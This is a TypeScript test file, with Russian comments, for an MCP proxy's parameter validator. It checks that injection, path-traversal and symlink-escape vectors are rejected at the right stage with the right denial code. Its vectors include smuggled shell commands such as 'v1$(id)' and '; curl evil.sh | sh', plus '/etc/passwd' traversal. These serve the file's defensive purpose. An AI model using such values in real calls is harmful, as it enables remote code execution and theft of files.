import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { asRecipeName, matcherKey, type PatternMatcher, type Recipe } from '@mcpproxy/contracts';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { codePointLength, DENIAL_CODES, DENIALS_MAX, VALUE_MAX_CODE_POINTS, type DenialCode } from './denial.js';
import { validateCall, type CallResult } from './index.js';
import { prepareRecipe, type PreparedRecipe } from './prepare.js';

/**
 * Корпус атак из `docs/09-metrics-and-eval.md` (R32), сценарии S3 и S4 (R33) и двусторонняя
 * перепись кодов отказа (R24).
 *
 * Перепись живёт здесь, а не рядом со словарём: там ситуаций ещё не существует, и она была бы
 * односторонней — код, переставший производиться, не уронил бы ничего.
 */

const NAME = asRecipeName('run_tests');
const strict: PatternMatcher = { test: (value: string): boolean => /^[\w./-]{0,64}$/u.test(value) };
const permissive: PatternMatcher = { test: (value: string): boolean => codePointLength(value) <= 64 };

const LONE_HIGH = '\uD800';
const NUL = '\u0000';
/** Кириллическая `а` — омоглиф латинской. `\w` её не принимает, и это должно быть отказом. */
const HOMOGLYPH = '\u0430bc';

let base = '';
let root = '';
let prepared: PreparedRecipe;

type Params = Readonly<Record<string, unknown>>;

const call = (params: unknown): CallResult => validateCall(prepared, params as Params);
const codesOf = (result: CallResult): readonly string[] =>
  result.ok ? [] : result.denials.map((one) => one.code);
const stagesOf = (result: CallResult): readonly string[] =>
  result.ok ? [] : result.denials.map((one) => one.stage);

beforeAll(() => {
  base = mkdtempSync(join(tmpdir(), 'e2-corpus-'));
  root = join(base, 'logs');
  mkdirSync(root);
  writeFileSync(join(root, 'a.log'), 'x');

  // Цель обхода СОЗДАЁТСЯ: иначе тест не отличает «мы не декодируем %2e» от «файла нет» и
  // зелен даже при полностью отсутствующем confinement.
  writeFileSync(join(base, 'secret.txt'), 'SECRET');

  // A3: симлинк на файл наружу и симлинк на каталог, через который идёт обход. Обе цели есть.
  symlinkSync(join(base, 'secret.txt'), join(root, 'out'));
  mkdirSync(join(base, 'outside'));
  writeFileSync(join(base, 'outside', 't.txt'), 'x');
  symlinkSync(join(base, 'outside'), join(root, 'dir'));

  const recipe: Recipe = {
    description: 'опись',
    exec: ['/usr/bin/true'],
    params: {
      pattern: { type: 'string', pattern: '^[\\w./-]{0,64}$', required: true, argv: ['--pattern={}'] },
      text: { type: 'string', pattern: '^.{0,64}$', maxLength: 12 },
      mode: { type: 'enum', values: ['fast', 'slow'] },
      count: { type: 'number', min: 1, max: 10, integer: true },
      file: { type: 'path', root, argv: ['--file={}'] },
    },
  };
  const matchers = new Map([
    [matcherKey(NAME, 'pattern'), strict],
    [matcherKey(NAME, 'text'), permissive],
  ]);
  const result = prepareRecipe(NAME, recipe, matchers, base);
  if (!result.ok) throw new Error(`фикстура не подготовилась: ${result.problems.join('; ')}`);
  prepared = result.prepared;
});

afterAll(() => {
  rmSync(base, { recursive: true, force: true });
});

describe('корпус A1 — инъекция в аргумент', () => {
  // Каждый вектор — против `run_tests.pattern`. Утверждается стадия, ожидаемый КОД и то, что
  // `argv` в результате отсутствует: отказ на не той стадии или с не тем кодом означает, что
  // вектор поймало не то правило.
  const vectors: ReadonlyArray<readonly [string, string, DenialCode]> = [
    ['точка с запятой', 'v1;rm', 'pattern-mismatch'],
    ['логическое И', 'v1&&rm', 'pattern-mismatch'],
    ['подстановка команды', 'v1$(id)', 'pattern-mismatch'],
    ['обратные кавычки', 'v1`id`', 'pattern-mismatch'],
    ['перевод строки', 'v1\nrm', 'pattern-mismatch'],
    ['юникод-омоглиф', HOMOGLYPH, 'pattern-mismatch'],
    ['нулевой байт', `v1${NUL}2`, 'pattern-mismatch'],
    ['одиночный суррогат', `v1${LONE_HIGH}`, 'not-canonicalizable'],
  ];

  it('ни один вектор не проходит и ни один не доходит до сборки argv', () => {
    for (const [label, value, code] of vectors) {
      const result = call({ pattern: value });
      expect(codesOf(result), label).toEqual([code]);
      expect(stagesOf(result), label).toEqual(['validate']);
      expect('argv' in result, label).toBe(false);
      expect(result.timings.map((one) => one.stage), label).toEqual(['validate']);
    }
  });
});

describe('корпус A2 — обход каталогов', () => {
  const vectors: ReadonlyArray<readonly [string, string, DenialCode]> = [
    ['относительный обход', '../secret.txt', 'path-escapes-root'],
    ['абсолютный путь', '/etc/passwd', 'path-escapes-root'],
    // Мы НЕ декодируем `%2e`, и цель обхода при этом существует: декодируй мы её —
    // код был бы `path-escapes-root`. `path-not-found` доказывает именно отсутствие декодирования.
    ['URL-кодирование', '%2e%2e%2fsecret.txt', 'path-not-found'],
    ['двойное кодирование', '%252e%252e%252fsecret.txt', 'path-not-found'],
  ];

  it('каждый вектор останавливается на resolve_paths с ожидаемым кодом', () => {
    for (const [label, value, code] of vectors) {
      const result = call({ pattern: 'ok', file: value });
      expect(codesOf(result), label).toEqual([code]);
      expect(stagesOf(result), label).toEqual(['resolve_paths']);
      expect('argv' in result, label).toBe(false);
    }
  });
});

describe('корпус A3 — симлинки', () => {
  const vectors: ReadonlyArray<readonly [string, string]> = [
    ['симлинк на файл наружу', 'out'],
    ['симлинк на каталог, через который идёт обход', 'dir/t.txt'],
  ];

  it('обе цели существуют и обе отвергаются по границе, а не по отсутствию', () => {
    for (const [label, value] of vectors) {
      const result = call({ pattern: 'ok', file: value });
      expect(codesOf(result), label).toEqual(['path-escapes-root']);
      expect(stagesOf(result), label).toEqual(['resolve_paths']);
    }
  });

  it('вектор на path-unusable: нулевой байт даёт не ENOENT, а третью ветку', () => {
    // Замерено (Ф10): `realpath` на пути с нулевым байтом бросает `ERR_INVALID_ARG_VALUE`.
    expect(codesOf(call({ pattern: 'ok', file: `a${NUL}b` }))).toEqual(['path-unusable']);
  });
});

describe('сценарий S3 — инъекция останавливается на валидации', () => {
  it('останавливается на validate, причина называет паттерн и не содержит значения', () => {
    const result = call({ pattern: '; curl evil.sh | sh' });
    expect(result.ok).toBe(false);
    if (result.ok) return;

    expect(result.denials.map((one) => one.code)).toEqual(['pattern-mismatch']);
    expect(result.denials[0].stage).toBe('validate');
    expect(result.denials[0].reason).toContain('pattern');
    expect(result.denials[0].reason).not.toContain('curl');
    expect('argv' in result).toBe(false);
  });
});

describe('сценарий S4 — граница confinement на демонстрации', () => {
  // Два вектора с РАЗНЫМИ фикстурами: два утверждения S4 требуют противоположных условий и
  // одним вектором проверены быть не могут.
  it('S4-а: лексический обход к НЕсуществующей цели даёт path-escapes-root, а не path-not-found', () => {
    // Только этот случай и проверяет предпроверку: при существующей цели код одинаков с ней
    // и без неё, и тест был бы зелен на сломанном механизме.
    const result = call({ pattern: 'ok', file: '../nope.txt' });
    expect(codesOf(result)).toEqual(['path-escapes-root']);
    expect(stagesOf(result)).toEqual(['resolve_paths']);
  });

  it('S4-б: симлинк наружу на СОЗДАННУЮ цель — причина несёт результат realpath', () => {
    // Именно это видит зал: куда вызов на самом деле указывал. У несуществующей цели
    // резолвнутого пути нет вовсе, поэтому вектор обязан быть отдельным.
    const result = call({ pattern: 'ok', file: 'out' });
    expect(result.ok).toBe(false);
    if (result.ok) return;

    expect(result.denials[0].code).toBe('path-escapes-root');
    expect(result.denials[0].reason).toContain(realpathSync(join(base, 'secret.txt')));
  });

  it('оба останавливаются на resolve_paths и ни один не доходит до build_argv', () => {
    for (const value of ['../nope.txt', 'out']) {
      const result = call({ pattern: 'ok', file: value });
      expect(result.timings.map((one) => one.stage), value).toEqual(['validate', 'resolve_paths']);
    }
  });
});

describe('двусторонняя перепись кодов отказа (R24)', () => {
  // Таблица «код ↔ вектор, который его производит». Сверяется с `DENIAL_CODES` в ОБЕ стороны:
  // код без вектора и вектор без кода одинаково краснеют.
  const CENSUS: ReadonlyArray<readonly [DenialCode, unknown]> = [
    ['bad-params-container', null],
    ['unknown-param', { pattern: 'ok', evil: 1 }],
    ['missing-required', {}],
    ['wrong-type', { pattern: 42 }],
    ['not-canonicalizable', { pattern: 'ok', text: `a${LONE_HIGH}` }],
    ['value-oversized', { pattern: 'ok', text: 'a'.repeat(VALUE_MAX_CODE_POINTS + 1) }],
    ['pattern-mismatch', { pattern: 'a;b' }],
    ['too-long', { pattern: 'ok', text: 'a'.repeat(13) }],
    ['not-in-enum', { pattern: 'ok', mode: 'Fast' }],
    ['not-finite', { pattern: 'ok', count: JSON.parse('1e400') as number }],
    ['out-of-range', { pattern: 'ok', count: 99 }],
    ['not-integer', { pattern: 'ok', count: 2.5 }],
    ['path-not-found', { pattern: 'ok', file: 'missing.log' }],
    ['path-escapes-root', { pattern: 'ok', file: '../secret.txt' }],
    ['path-unusable', { pattern: 'ok', file: `a${NUL}b` }],
    [
      'denials-truncated',
      Object.fromEntries([
        ['pattern', 'ok'],
        ...Array.from({ length: DENIALS_MAX + 50 }, (_unused, i) => [`k${String(i).padStart(4, '0')}`, 1] as const),
      ]),
    ],
  ];

  it('каждый вектор действительно производит свой код', () => {
    for (const [code, params] of CENSUS) {
      expect(codesOf(call(params)), code).toContain(code);
    }
  });

  it('перепись покрывает каждый код словаря и не выдумывает лишних', () => {
    const covered = new Set(CENSUS.map(([code]) => code));
    // Сравнение множеств в обе стороны, а не `toEqual` на массивах: перестановка строк
    // таблицы не должна краснеть, а недостающий код — обязан, и с именем.
    expect([...DENIAL_CODES].filter((one) => !covered.has(one))).toEqual([]);
    expect([...covered].filter((one) => !(DENIAL_CODES as readonly string[]).includes(one))).toEqual([]);
  });
});
